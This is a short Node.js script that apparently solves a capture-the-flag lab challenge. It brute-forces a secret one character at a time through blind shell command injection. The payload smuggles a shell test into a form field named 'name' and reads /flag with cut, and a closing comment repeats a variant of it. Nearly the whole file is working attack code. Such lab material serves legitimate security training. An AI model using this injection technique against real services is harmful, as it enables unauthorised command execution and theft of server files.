const axios = require("axios");

const URL = "http://lab.scist.org:31601/";
const charset =
  "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_";
let flag = "";

(async () => {
  for (let i = 1; i <= 100; i++) {
    let found = false;
    for (const c of charset) {
      const payload = `'; [ "$(cut -c${i} /flag)" != "${c}" ] #`;
      try {
        const response = await axios.post(
          URL,
          new URLSearchParams({ name: payload }).toString(),
          {
            headers: { "Content-Type": "application/x-www-form-urlencoded" },
            timeout: 5000,
          }
        );
        if (response.data.includes("<pre>fail</pre>")) {
          flag += c;
          console.log(`[+] Found char ${i}: ${c} → ${flag}`);
          found = true;
          break;
        }
      } catch (err) {
        console.error(`[!] Request error: ${err.message}`);
      }
    }
    if (!found) {
      console.log("[*] No matching character found — flag likely complete.");
      break;
    }
  }
  console.log(`\n🏁 Final Flag: ${flag}`);
})();

// '; [ "$(cut -c2 /flag)" = "C" ] #
